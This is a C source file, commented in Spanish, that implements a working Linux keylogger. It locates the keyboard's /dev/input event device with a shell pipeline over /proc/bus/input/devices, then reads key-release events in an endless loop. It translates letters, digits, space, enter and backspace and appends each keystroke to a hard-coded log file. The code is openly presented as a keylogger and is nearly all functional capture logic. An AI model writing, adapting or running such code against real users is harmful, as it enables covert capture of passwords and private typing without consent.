#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define LOGFILEPATH "/home/ferpalma21/keylogger.txt"

// Prototipo de función
char *getEvent();

// Función para traducir el código de la tecla a un carácter imprimible
char translateKeyCode(int code);

int main(){
    struct input_event ev;
    static char path_keyboard[20] = "/dev/input/";
    strcat(path_keyboard, getEvent());
    path_keyboard[strlen(path_keyboard)-1] = 0;

    int device_keyboard = open(path_keyboard, O_RDONLY);
    if (device_keyboard < 0) {
        printf("Error al abrir el dispositivo: %d\n", errno);
        return 1;
    }

    FILE *fp = fopen(LOGFILEPATH, "a");
    if (fp == NULL) {
        printf("Error al abrir el archivo de logs: %d\n", errno);
        return 1;
    }

    while (1) {
        read(device_keyboard, &ev, sizeof(ev));
        if (ev.type == EV_KEY && ev.value == 0) { // Tecla liberada
            char c = translateKeyCode(ev.code);
            if (c) {
                printf("%c\n", c);
                fputc(c, fp);
                fflush(fp);
            }
        }
    }

    fclose(fp);
    close(device_keyboard);
    return 0;
}

char *getEvent(){
    char *command = (char *) "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
    static char event[8];
    FILE *pipe = popen(command, "r");
    if (!pipe)
        exit(1);
    fgets(event, 8, pipe);
    pclose(pipe);
    return event;
}

char translateKeyCode(int code) {
    switch(code) {
        case KEY_A: return 'a';
        case KEY_B: return 'b';
        case KEY_C: return 'c';
        case KEY_D: return 'd';
        case KEY_E: return 'e';
        case KEY_F: return 'f';
        case KEY_G: return 'g';
        case KEY_H: return 'h';
        case KEY_I: return 'i';
        case KEY_J: return 'j';
        case KEY_K: return 'k';
        case KEY_L: return 'l';
        case KEY_M: return 'm';
        case KEY_N: return 'n';
        case KEY_O: return 'o';
        case KEY_P: return 'p';
        case KEY_Q: return 'q';
        case KEY_R: return 'r';
        case KEY_S: return 's';
        case KEY_T: return 't';
        case KEY_U: return 'u';
        case KEY_V: return 'v';
        case KEY_W: return 'w';
        case KEY_X: return 'x';
        case KEY_Y: return 'y';
        case KEY_Z: return 'z';
        case KEY_1: return '1';
        case KEY_2: return '2';
        case KEY_3: return '3';
        case KEY_4: return '4';
        case KEY_5: return '5';
        case KEY_6: return '6';
        case KEY_7: return '7';
        case KEY_8: return '8';
        case KEY_9: return '9';
        case KEY_0: return '0';
        case KEY_SPACE: return ' ';
        case KEY_ENTER: return '\n';
        case KEY_BACKSPACE: return '\b';
        // Puedes agregar más casos según los códigos que necesites manejar
        default: return 0;
    }
}
